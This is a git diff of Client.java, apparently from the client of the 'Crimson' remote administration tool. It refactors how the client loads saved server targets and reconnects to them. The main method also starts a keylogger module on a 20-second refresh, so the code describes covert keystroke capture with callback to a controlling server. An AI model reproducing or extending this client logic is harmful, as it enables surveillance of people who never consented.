@@ -20,14 +20,11 @@ package com.subterranean_security.crimson.client;
 import java.io.File;
 import java.util.List;
 
-import javax.net.ssl.SSLException;
-
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.modules.Keylogger.RefreshMethod;
-import com.subterranean_security.crimson.client.net.ClientConnector;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.Platform;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
@@ -38,9 +35,7 @@ import com.subterranean_security.crimson.core.util.EH;
 public class Client {
 	private static final Logger log = LoggerFactory.getLogger(Client.class);
 
-	public static ClientConnector connector;
 	public static ViewerDB clientDB;
-	public static int connectionIterations = 0;
 
 	public static void main(String[] args) {
 
@@ -58,10 +53,10 @@ public class Client {
 		Platform.Advanced.loadLapis();
 		Platform.Advanced.loadSigar();
 
-		List<NetworkTarget> nts = null;
 		try {
 			clientDB = new ViewerDB(new File(Common.Directories.base + "/var/client.db"));
-			nts = getExternalNts();
+			ClientStore.Connections.setTargets((List<NetworkTarget>) clientDB.getObject("nts"));
+			ClientStore.Connections.setPeriod(clientDB.getInteger("reconnect_period"));
 		} catch (Exception e) {
 			// TODO: handle exception
 			System.out.println("Database error");
@@ -72,28 +67,9 @@ public class Client {
 		} catch (Exception e2) {
 		}
 
-		connectionRoutine(nts);
-
 		Keylogger.start(RefreshMethod.TIME, 20000);
 
-	}
-
-	private static List<NetworkTarget> getExternalNts() throws Exception {
-
-		return (List<NetworkTarget>) clientDB.getObject("nts");
-	}
-
-	public static void connectionRoutine(List<NetworkTarget> nt) {
-		connectionIterations++;
-		for (NetworkTarget n : nt) {
-			try {
-				log.debug("Attempting connection to: " + n.getServer() + ":" + n.getPort());
-				connector = new ClientConnector(n.getServer(), n.getPort());
-			} catch (SSLException | InterruptedException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
-		}
+		ClientStore.Connections.connectionRoutine();
 
 	}
 
